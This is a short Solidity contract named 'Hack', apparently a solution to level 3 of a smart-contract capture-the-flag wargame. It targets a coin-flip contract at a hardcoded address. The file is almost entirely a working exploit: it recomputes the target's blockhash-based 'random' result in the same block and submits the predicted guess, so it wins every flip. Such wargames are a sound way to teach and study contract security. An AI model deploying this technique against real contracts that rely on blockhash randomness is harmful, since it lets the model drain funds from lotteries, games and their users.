// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface CoinFlip {
    function flip(bool _guess) external;
}

// deploy another contract to interact with existing one
contract Hack {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip lvl03 = CoinFlip(0x605AF36FA62353f714cB9eE628474956d661cF3C);

    // THe hack here is that before calling the flip function, we pre-calculate the output.
    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        lvl03.flip(side);
    }
}
